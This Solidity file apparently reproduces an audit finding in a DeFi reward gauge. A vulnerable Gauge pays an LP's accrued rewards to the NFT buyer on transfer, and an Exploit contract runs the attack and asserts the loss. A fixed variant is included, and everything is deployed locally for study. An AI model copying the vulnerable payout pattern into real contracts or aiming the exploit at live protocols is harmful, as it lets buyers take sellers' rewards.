// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BMX DeliHook — an LP NFT transfer pays accrued rewards to the new owner
    (Sherlock 0x73696d616f, H-6, September 2025).
    SYNTHETIC, cheatcode-free, one block.
    transferFrom writes the new owner, then unsubscribe reads ownerOf and
    _claimRewards pays that address. N = 1,000 BMX accrued by the old LP
    is transferred to the buyer. The old LP holds 0. The position is removed,
    so a later claim by the buyer returns 0: the N is no longer claimable.
    Control pays the subscriber recorded at subscription, not ownerOf. */

struct Reward {
    uint256 accrued;
}

library PositionRewards {
    function claim(Reward storage self) internal returns (uint256 amount) {
        amount = self.accrued;
        self.accrued = 0;
    }
}

contract Token {
    string public constant name = "BMX";
    string public constant symbol = "BMX";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Gauge {
    using PositionRewards for Reward;

    Token public BMX;
    address public manager;
    mapping(bytes32 => Reward) public positionRewards;
    mapping(bytes32 => address) public subscriber;

    constructor(Token bmx_) {
        BMX = bmx_;
    }

    function setManager(address manager_) external {
        manager = manager_;
    }

    function subscribe(bytes32 posKey, address lp, uint256 amount) external {
        subscriber[posKey] = lp;
        positionRewards[posKey].accrued = amount;
        require(BMX.balanceOf(address(this)) >= amount, "funded");
    }

    function notifyUnsubscribeWithContext(
        bytes32 posKey,
        bytes32 poolIdRaw,
        int24 currentTick,
        address ownerAddr,
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) external {
        require(msg.sender == manager, "auth");
        poolIdRaw;
        currentTick;
        tickLower;
        tickUpper;
        liquidity;
        _claimRewards(posKey, ownerAddr);
        delete subscriber[posKey];
    }

    function _claimRewards(bytes32 posKey, address recipient) internal returns (uint256 amount) {
        amount = positionRewards[posKey].claim();

        if (amount > 0) {
            // @> VULN: recipient is the NFT owner after transferFrom, so the buyer is paid
            BMX.transfer(recipient, amount);
        }
    }

    function accrued(bytes32 posKey) external view returns (uint256) {
        return positionRewards[posKey].accrued;
    }
}

contract GaugeFixed {
    using PositionRewards for Reward;

    Token public BMX;
    address public manager;
    mapping(bytes32 => Reward) public positionRewards;
    mapping(bytes32 => address) public subscriber;

    constructor(Token bmx_) {
        BMX = bmx_;
    }

    function setManager(address manager_) external {
        manager = manager_;
    }

    function subscribe(bytes32 posKey, address lp, uint256 amount) external {
        subscriber[posKey] = lp;
        positionRewards[posKey].accrued = amount;
    }

    function notifyUnsubscribeWithContext(
        bytes32 posKey,
        bytes32,
        int24,
        address,
        int24,
        int24,
        uint128
    ) external {
        require(msg.sender == manager, "auth");
        // FIX: checkpoint pays the subscriber recorded when the position was opened
        _claimRewards(posKey, subscriber[posKey]);
        delete subscriber[posKey];
    }

    function _claimRewards(bytes32 posKey, address recipient) internal returns (uint256 amount) {
        amount = positionRewards[posKey].claim();
        if (amount > 0) BMX.transfer(recipient, amount);
    }
}

contract PositionManager {
    Gauge public gauge;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => bool) public hasSubscriber;
    bytes32 public constant POS = bytes32(uint256(1));

    constructor(Gauge gauge_) {
        gauge = gauge_;
    }

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
    }

    function subscribe(uint256 id, uint256 amount) external {
        require(ownerOf[id] == msg.sender, "owner");
        hasSubscriber[id] = true;
        gauge.subscribe(POS, msg.sender, amount);
    }

    function transferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "owner");
        ownerOf[id] = to;
        if (hasSubscriber[id]) {
            hasSubscriber[id] = false;
            _unsubscribe(id);
        }
    }

    function _unsubscribe(uint256 id) internal {
        address owner = ownerOf[id];
        gauge.notifyUnsubscribeWithContext(POS, bytes32(0), 0, owner, 0, 0, 0);
    }
}

contract PositionManagerFixed {
    GaugeFixed public gauge;
    mapping(uint256 => address) public ownerOf;
    bytes32 public constant POS = bytes32(uint256(1));

    constructor(GaugeFixed gauge_) {
        gauge = gauge_;
    }

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function subscribe(uint256 id, uint256 amount) external {
        gauge.subscribe(POS, msg.sender, amount);
    }

    function transferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "owner");
        ownerOf[id] = to;
        gauge.notifyUnsubscribeWithContext(POS, bytes32(0), 0, ownerOf[id], 0, 0, 0);
    }
}

contract Lp {
    function open(PositionManager pm, uint256 id, uint256 amount) external {
        pm.subscribe(id, amount);
    }

    function sell(PositionManager pm, address buyer, uint256 id) external {
        pm.transferFrom(address(this), buyer, id);
    }

    function openFixed(PositionManagerFixed pm, uint256 id, uint256 amount) external {
        pm.subscribe(id, amount);
    }

    function sellFixed(PositionManagerFixed pm, address buyer, uint256 id) external {
        pm.transferFrom(address(this), buyer, id);
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 1;
    uint256 public constant N = 1_000 ether;
    bytes32 public constant POS = bytes32(uint256(1));

    Token public bmx;
    Gauge public gauge;
    PositionManager public pm;
    Lp public lp;
    uint256 public oldBalance;
    uint256 public buyerBalance;
    uint256 public stillClaimable;

    constructor() {
        bmx = new Token();
        gauge = new Gauge(bmx);
        pm = new PositionManager(gauge);
        gauge.setManager(address(pm));
        lp = new Lp();
    }

    function run() external {
        address buyer = address(this);
        bmx.mint(address(gauge), N);
        pm.mint(address(lp), TOKEN_ID);
        lp.open(pm, TOKEN_ID, N);
        lp.sell(pm, buyer, TOKEN_ID);
        oldBalance = bmx.balanceOf(address(lp));
        buyerBalance = bmx.balanceOf(buyer);
        stillClaimable = gauge.accrued(POS);
        require(pm.ownerOf(TOKEN_ID) == buyer, "buyer does not hold the NFT");
        require(oldBalance == 0, "old LP still holds rewards");
        require(buyerBalance == N, "buyer was not paid N");
        require(stillClaimable == 0, "rewards are still claimable");
        require(bmx.balanceOf(address(lp)) == 0, "old LP balance");
    }
}
